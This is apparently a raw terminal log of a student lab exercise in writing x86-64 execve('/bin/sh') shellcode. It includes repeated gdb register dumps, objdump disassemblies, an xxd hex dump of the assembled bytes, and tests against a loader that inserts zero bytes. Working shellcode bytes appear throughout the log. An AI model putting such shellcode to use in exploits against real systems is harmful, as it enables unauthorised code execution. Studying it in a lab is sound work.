@@ -1,0 +1,2049 @@
+   0x60104a <code+10>:  pop    rsi
+   0x60104b <code+11>:  mov    al,0x3b
+=> 0x60104d <code+13>:  syscall 
+   0x60104f <code+15>:  call   0x601042 <code+2>
+   0x601054 <code+20>:  (bad)  
+   0x601055 <code+21>:  (bad)  
+   0x601056 <code+22>:  imul   ebp,DWORD PTR [rsi+0x2f],0x6873
+No argument
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe590 --> 0x601054 --> 0x68732f6e69622f ('/bin/sh')
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0xffffffffffffffda 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x0 
+RSI: 0x0 
+RDI: 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe698 --> 0x7fffffffe8c6 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe688 --> 0x7fffffffe8af ("/home/sp794/shelltest2")
+RDI: 0x1 
+RBP: 0x7fffffffe5a0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x60103b --> 0x5f0feb0000000000 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x0 
+RSI: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0xffffffffffffffda 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0xffffffffffffffda 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x0 
+RSI: 0x0 
+RDI: 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe598 --> 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+RIP: 0x601042 --> 0xf63148410777805f 
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe430 --> 0x0 
+R11: 0x346 
+R12: 0x400400 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe680 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x60103c:    add    BYTE PTR [rax],al
+   0x60103e:    add    BYTE PTR [rax],al
+   0x601040 <code>:     jmp    0x601051 <code+17>
+=> 0x601042 <code+2>:   pop    rdi
+   0x601043 <code+3>:   xor    BYTE PTR [rdi+0x7],0x41
+   0x601047 <code+7>:   xor    rsi,rsi
+   0x60104a <code+10>:  xor    rdx,rdx
+   0x60104d <code+13>:  mov    al,0x3b
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe598 --> 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+0008| 0x7fffffffe5a0 --> 0x0 
+0016| 0x7fffffffe5a8 --> 0x7ffff7a36f45 (<__libc_start_main+245>:       mov   
+ edi,eax)                                                                    
+0024| 0x7fffffffe5b0 --> 0x0 
+0032| 0x7fffffffe5b8 --> 0x7fffffffe688 --> 0x7fffffffe8af ("/home/sp794/shell
+test2")                                                                      
+0040| 0x7fffffffe5c0 --> 0x100000000 
+0048| 0x7fffffffe5c8 --> 0x4004ed (<main>:      push   rbp)
+0056| 0x7fffffffe5d0 --> 0x0 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe698 --> 0x7fffffffe8c6 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe688 --> 0x7fffffffe8af ("/home/sp794/shelltest2")
+RDI: 0x1 
+RBP: 0x7fffffffe5a0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x60103b --> 0x5f0feb0000000000 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x0 
+RSI: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0xffffffffffffffda 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x0 
+RSI: 0x0 
+RDI: 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe5a0 --> 0x0 
+RIP: 0x601051 --> 0x69622fffffffece8 
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe698 --> 0x7fffffffe8c6 ("XDG_SESSION_ID=21")
+RSI: 0x7fffffffe688 --> 0x7fffffffe8af ("/home/sp794/shelltest2")
+RDI: 0x1 
+RBP: 0x7fffffffe5a0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x601040 --> 0x48410777805f0feb 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x60103b --> 0x5f0feb0000000000 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x0 
+RSI: 0x0 
+RDI: 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+RBP: 0x7fffffffe5a0 --> 0x0 
+RSP: 0x7fffffffe5a0 --> 0x0 
+RIP: 0x60104f --> 0x2fffffffece8050f 
+R8 : 0x7ffff7dd4e80 --> 0x0 
+R9 : 0x7ffff7dea530 (push   rbp)
+R10: 0x7fffffffe430 --> 0x0 
+R11: 0x7ffff7a36e50 (<__libc_start_main>:       push   r14)
+R12: 0x400400 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe680 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflo)
+[-------------------------------------code------------------------------------
+-]                                                                           
+   0x601048 <code+8>:   xor    esi,esi
+   0x60104a <code+10>:  xor    rdx,rdx
+   0x60104d <code+13>:  mov    al,0x3b
+=> 0x60104f <code+15>:  syscall 
+   0x601051 <code+17>:  call   0x601042 <code+2>
+   0x601056 <code+22>:  (bad)  
+   0x601057 <code+23>:  (bad)  
+   0x601058 <code+24>:  imul   ebp,DWORD PTR [rsi+0x2f],0x6873
+Guessed arguments:
+arg[0]: 0x601056 --> 0x68732f6e69622f ('/bin/sh')
+arg[1]: 0x0 
+arg[2]: 0x0 
+[------------------------------------stack------------------------------------
+-]                                                                           
+0000| 0x7fffffffe5a0 --> 0x0 
+0008| 0x7fffffffe5a8 --> 0x7ffff7a36f45 (<__libc_start_main+245>:       mov   
+ edi,eax)                                                                    
+0016| 0x7fffffffe5b0 --> 0x0 
+0024| 0x7fffffffe5b8 --> 0x7fffffffe688 --> 0x7fffffffe8af ("/home/sp794/shell
+test2")                                                                      
+0032| 0x7fffffffe5c0 --> 0x100000000 
+0040| 0x7fffffffe5c8 --> 0x4004ed (<main>:      push   rbp)
+0048| 0x7fffffffe5d0 --> 0x0 
+0056| 0x7fffffffe5d8 --> 0x49fb1cde8a18b53f 
+[-----------------------------------------------------------------------------
+-]                                                                           
+Legend: code, data, rodata, value
+0x000000000060104f in code ()
+gdb-peda$ p $eax
+$4 = 0x60103b
+gdb-peda$ q
+sp794@c-challenges-sp794-1:~$ !nasm
+nasm shellcode-sh.asm -o shellcode.o -felf64
+<3456789abcdef]\{2\}\)/\\x\1/g'|sed 's/ //g' > tmp                        
+sp794@c-challenges-sp794-1:~$ !gcc
+gcc shelltest2.c -o shelltest2 -g
+sp794@c-challenges-sp794-1:~$ ./shelltest2
+$ exit
+sp794@c-challenges-sp794-1:~$ wc -c shelltest2
+9647 shelltest2
+sp794@c-challenges-sp794-1:~$ wc -c tmp
+128 tmp
+sp794@c-challenges-sp794-1:~$ objdump -o shellcode.o
+objdump: invalid option -- 'o'
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRt] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frame
+s,                                                                           
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+
+ The following switches are optional:
+  -b, --target=BFDNAME           Specify the target object format as BFDNAME
+  -m, --architecture=MACHINE     Specify the target architecture as MACHINE
+  -j, --section=NAME             Only display information for section NAME
+  -M, --disassembler-options=OPT Pass text OPT on to the disassembler
+  -EB --endian=big               Assume big endian format when disassembling
+  -EL --endian=little            Assume little endian format when disassemblin
+g                                                                            
+      --file-start-context       Include context from start of file (with -S)
+  -I, --include=DIR              Add DIR to search list for source files
+  -l, --line-numbers             Include line numbers and filenames in output
+  -F, --file-offsets             Include file offsets when displaying informat
+ion                                                                          
+  -C, --demangle[=STYLE]         Decode mangled/processed symbol names
+                                  The STYLE, if specified, can be `auto', `gnu
+',                                                                           
+                                  `lucid', `arm', `hp', `edg', `gnu-v3', `java
+'                                                                            
+                                  or `gnat'
+  -w, --wide                     Format output for more than 80 columns
+  -z, --disassemble-zeroes       Do not skip blocks of zeroes when disassembli
+ng                                                                           
+      --start-address=ADDR       Only process data whose address is >= ADDR
+      --stop-address=ADDR        Only process data whose address is <= ADDR
+      --prefix-addresses         Print complete address alongside disassembly
+      --[no-]show-raw-insn       Display hex alongside symbolic disassembly
+      --insn-width=WIDTH         Display WIDTH bytes on a single line for -d
+      --adjust-vma=OFFSET        Add OFFSET to all displayed section addresses
+      --special-syms             Include special symbols in symbol dumps
+      --prefix=PREFIX            Add PREFIX to absolute paths for -S
+      --prefix-strip=LEVEL       Strip initial directory names for -S
+      --dwarf-depth=N        Do not display DIEs at depth N or greater
+      --dwarf-start=N        Display DIEs starting with N, at the same depth
+                             or deeper
+      --dwarf-check          Make additional dwarf internal consistency checks
+.                                                                            
+
+objdump: supported targets: elf64-x86-64 elf32-i386 elf32-x86-64 a.out-i386-li
+nux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-lit
+tle elf32-big pe-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary i
+hex                                                                          
+objdump: supported architectures: i386 i386:x86-64 i386:x64-32 i8086 i386:inte
+l i386:x86-64:intel i386:x64-32:intel i386:nacl i386:x86-64:nacl i386:x64-32:n
+acl l1om l1om:intel k1om k1om:intel plugin                                   
+
+The following i386/x86-64 specific disassembler options are supported for use
+with the -M switch (multiple options should be separated by commas):
+  x86-64 Disassemble in 64bit mode
+  i386 Disassemble in 32bit mode
+  i8086 Disassemble in 16bit mode
+  att Display instruction in AT&T syntax
+  intel Display instruction in Intel syntax
+  att-mnemonic
+              Display instruction in AT&T mnemonic
+  intel-mnemonic
+              Display instruction in Intel mnemonic
+  addr64 Assume 64bit address size
+  addr32 Assume 32bit address size
+  addr16 Assume 16bit address size
+  data32 Assume 32bit data size
+  data16 Assume 16bit data size
+  suffix Always display instruction suffix in AT&T syntax
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 11                   jmp    13 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   9:   48 31 f6                xor    %rsi,%rsi
+   c:   48 31 d2                xor    %rdx,%rdx
+   f:   b0 3b                   mov    $0x3b,%al
+  11:   0f 05                   syscall 
+
+0000000000000013 <_push_filename>:
+  13:   e8 ea ff ff ff          callq  2 <_main>
+
+0000000000000018 <path>:
+  18:   2f                      (bad)  
+  19:   62                      (bad)  
+  1a:   69                      .byte 0x69
+  1b:   6e                      outsb  %ds:(%rsi),(%dx)
+  1c:   2f                      (bad)  
+  1d:   73 68                   jae    87 <path+0x6f>
+  1f:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ !nasm                 
+nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 14                   jmp    16 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   c:   48 31 f6                xor    %rsi,%rsi
+   f:   48 31 d2                xor    %rdx,%rdx
+  12:   b0 3b                   mov    $0x3b,%al
+  14:   0f 05                   syscall 
+
+0000000000000016 <_push_filename>:
+  16:   e8 e7 ff ff ff          callq  2 <_main>
+
+000000000000001b <path>:
+  1b:   2f                      (bad)  
+  1c:   62                      (bad)  
+  1d:   69                      .byte 0x69
+  1e:   6e                      outsb  %ds:(%rsi),(%dx)
+  1f:   2f                      (bad)  
+  20:   73 68                   jae    8a <path+0x6f>
+  22:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 18                   jmp    1a <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   c:   90                      nop
+   d:   90                      nop
+   e:   eb 01                   jmp    11 <_main+0xf>
+  10:   48 31 f6                xor    %rsi,%rsi
+  13:   48 31 d2                xor    %rdx,%rdx
+  16:   b0 3b                   mov    $0x3b,%al
+  18:   0f 05                   syscall 
+
+000000000000001a <_push_filename>:
+  1a:   e8 e3 ff ff ff          callq  2 <_main>
+
+000000000000001f <path>:
+  1f:   2f                      (bad)  
+  20:   62                      (bad)  
+  21:   69                      .byte 0x69
+  22:   6e                      outsb  %ds:(%rsi),(%dx)
+  23:   2f                      (bad)  
+  24:   73 68                   jae    8e <path+0x6f>
+  26:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 1a                   jmp    1c <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   c:   90                      nop
+   d:   90                      nop
+   e:   eb 01                   jmp    11 <_main+0xf>
+  10:   48 31 f6                xor    %rsi,%rsi
+  13:   48 31 d2                xor    %rdx,%rdx
+  16:   eb 01                   jmp    19 <_main+0x17>
+  18:   b0 3b                   mov    $0x3b,%al
+  1a:   0f 05                   syscall 
+
+000000000000001c <_push_filename>:
+  1c:   e8 e1 ff ff ff          callq  2 <_main>
+
+0000000000000021 <path>:
+  21:   2f                      (bad)  
+  22:   62                      (bad)  
+  23:   69                      .byte 0x69
+  24:   6e                      outsb  %ds:(%rsi),(%dx)
+  25:   2f                      (bad)  
+  26:   73 68                   jae    90 <path+0x6f>
+  28:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 1e                   jmp    20 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   c:   90                      nop
+   d:   90                      nop
+   e:   eb 01                   jmp    11 <_main+0xf>
+  10:   48 31 f6                xor    %rsi,%rsi
+  13:   48 31 d2                xor    %rdx,%rdx
+  16:   eb 01                   jmp    19 <_main+0x17>
+  18:   b0 3b                   mov    $0x3b,%al
+  1a:   0f 05                   syscall 
+  1c:   90                      nop
+  1d:   90                      nop
+  1e:   eb 01                   jmp    21 <_push_filename+0x1>
+
+0000000000000020 <_push_filename>:
+  20:   e8 dd ff ff ff          callq  2 <_main>
+
+0000000000000025 <path>:
+  25:   2f                      (bad)  
+  26:   62                      (bad)  
+  27:   69                      .byte 0x69
+  28:   6e                      outsb  %ds:(%rsi),(%dx)
+  29:   2f                      (bad)  
+  2a:   73 68                   jae    94 <path+0x6f>
+  2c:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 1e                   jmp    20 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   c:   90                      nop
+   d:   90                      nop
+   e:   eb 01                   jmp    11 <_main+0xf>
+  10:   48 31 f6                xor    %rsi,%rsi
+  13:   48 31 d2                xor    %rdx,%rdx
+  16:   eb 01                   jmp    19 <_main+0x17>
+  18:   b0 3b                   mov    $0x3b,%al
+  1a:   0f 05                   syscall 
+  1c:   90                      nop
+  1d:   90                      nop
+  1e:   eb 01                   jmp    21 <_push_filename+0x1>
+
+0000000000000020 <_push_filename>:
+  20:   e8 dd ff ff ff          callq  2 <_main>
+
+0000000000000025 <path>:
+  25:   2f                      (bad)  
+  26:   62                      (bad)  
+  27:   69                      .byte 0x69
+  28:   6e                      outsb  %ds:(%rsi),(%dx)
+  29:   2f                      (bad)  
+  2a:   73 68                   jae    94 <path+0x6f>
+  2c:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ !nasm
+nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 1e                   jmp    20 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   c:   90                      nop
+   d:   90                      nop
+   e:   eb 01                   jmp    11 <_main+0xf>
+  10:   48 31 f6                xor    %rsi,%rsi
+  13:   48 31 d2                xor    %rdx,%rdx
+  16:   eb 01                   jmp    19 <_main+0x17>
+  18:   b0 3b                   mov    $0x3b,%al
+  1a:   0f 05                   syscall 
+  1c:   90                      nop
+  1d:   90                      nop
+  1e:   eb 01                   jmp    21 <_push_filename+0x1>
+
+0000000000000020 <_push_filename>:
+  20:   e8 dd ff ff ff          callq  2 <_main>
+  25:   90                      nop
+  26:   eb 01                   jmp    29 <path+0x1>
+
+0000000000000028 <path>:
+  28:   2f                      (bad)  
+  29:   62                      (bad)  
+  2a:   69                      .byte 0x69
+  2b:   6e                      outsb  %ds:(%rsi),(%dx)
+  2c:   2f                      (bad)  
+  2d:   73 68                   jae    97 <path+0x6f>
+  2f:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 21                   jmp    23 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   48 83 c7 03             add    $0x3,%rdi
+   9:   eb 01                   jmp    c <_main+0xa>
+   b:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+   f:   90                      nop
+  10:   90                      nop
+  11:   eb 01                   jmp    14 <_main+0x12>
+  13:   48 31 f6                xor    %rsi,%rsi
+  16:   48 31 d2                xor    %rdx,%rdx
+  19:   eb 01                   jmp    1c <_main+0x1a>
+  1b:   b0 3b                   mov    $0x3b,%al
+  1d:   0f 05                   syscall 
+  1f:   90                      nop
+  20:   90                      nop
+  21:   eb 01                   jmp    24 <_push_filename+0x1>
+
+0000000000000023 <_push_filename>:
+  23:   e8 da ff ff ff          callq  2 <_main>
+  28:   90                      nop
+  29:   eb 01                   jmp    2c <path+0x1>
+
+000000000000002b <path>:
+  2b:   2f                      (bad)  
+  2c:   62                      (bad)  
+  2d:   69                      .byte 0x69
+  2e:   6e                      outsb  %ds:(%rsi),(%dx)
+  2f:   2f                      (bad)  
+  30:   73 68                   jae    9a <path+0x6f>
+  32:   41                      rex.B
+sp794@c-challenges-sp794-1:~$ nasm shellcode-sh.asm -o shellcode.o -felf64
+sp794@c-challenges-sp794-1:~$ objdump -d shellcode.o                      
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:   eb 26                   jmp    28 <_push_filename>
+
+0000000000000002 <_main>:
+   2:   31 c0                   xor    %eax,%eax
+   4:   5f                      pop    %rdi
+   5:   90                      nop
+   6:   eb 01                   jmp    9 <_main+0x7>
+   8:   48 83 c7 03             add    $0x3,%rdi
+   c:   90                      nop
+   d:   90                      nop
+   e:   eb 01                   jmp    11 <_main+0xf>
+  10:   80 77 07 41             xorb   $0x41,0x7(%rdi)
+  14:   90                      nop
+  15:   90                      nop
+  16:   eb 01                   jmp    19 <_main+0x17>
+  18:   48 31 f6                xor    %rsi,%rsi
+  1b:   48 31 d2                xor    %rdx,%rdx
+  1e:   eb 01                   jmp    21 <_main+0x1f>
+  20:   b0 3b                   mov    $0x3b,%al
+  22:   0f 05                   syscall 
+  24:   90                      nop
+  25:   90                      nop
+  26:   eb 01                   jmp    29 <_push_filename+0x1>
+
+0000000000000028 <_push_filename>:
+  28:   e8 d5 ff ff ff          callq  2 <_main>
+  2d:   90                      nop
+  2e:   eb 01                   jmp    31 <path+0x1>
+
+0000000000000030 <path>:
+  30:   2f                      (bad)  
+  31:   62                      (bad)  
+  32:   69                      .byte 0x69
+  33:   6e                      outsb  %ds:(%rsi),(%dx)
+  34:   2f                      (bad)  
+  35:   73 68                   jae    9f <path+0x6f>
+  37:   41                      rex.B
+<\([0123456789abcdef]\{2\}\)/\\x\1/g'|sed 's/ //g'> tmp                    
+sp794@c-challenges-sp794-1:~$ !gcc
+gcc shelltest2.c -o shelltest2 -g
+sp794@c-challenges-sp794-1:~$ ./shelltest2 
+sp794@c-challenges-sp794-1:~$ xxd shellcode
+0000000: eb26 31c0 5f90 eb01 4883 c703 9090 eb01  .&1._...H.......
+0000010: 8077 0741 9090 eb01 4831 f648 31d2 eb01  .w.A....H1.H1...
+0000020: b03b 0f05 9090 eb01 e8d5 ffff ff90 eb01  .;..............
+0000030: 2f62 696e 2f73 6841                      /bin/shA
+sp794@c-challenges-sp794-1:~$ ./invitro2 shellcode
+
+eb 26 31 c0 5f 90 eb 01 
+00 48 83 c7 03 90 90 eb 
+01 00 80 77 07 41 90 90 
+eb 01 00 48 31 f6 48 31 
+d2 eb 01 00 b0 3b 0f 05 
+90 90 eb 01 00 e8 d5 ff 
+ff ff 90 eb 01 00 2f 62 
+69 6e 2f 73 68 41 00 00 
+00 00 00 00 00 00 00 00 
+Read 72 bytes of shellcode! Executing...
+Segmentation fault
+sp794@c-challenges-sp794-1:~$ gdb
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe500 --> 0x1eb905fc0310beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x7fffffffe500 --> 0x1eb905fc0310beb 
+RBX: 0x0 
+RCX: 0xffffffffffffffff 
+RDX: 0x7ffff7dd59d0 --> 0x0 
+RSI: 0x7fffffffbdd0 ("Read 72 bytes of shellcode! Executing...\n")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x40078d (<main>:  push   rbp)
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x7fffffffe6a0 --> 0x7fffffffe8c8 ("XDG_SESSION_ID=21")
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x99b10c6cf141ec00 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x99b10c6cf141ec00 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+ [----------------------------------registers---------------------------------
+--]                                                                          
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0xf 
+RDX: 0x10 
+ [----------------------------------registers---------------------------------
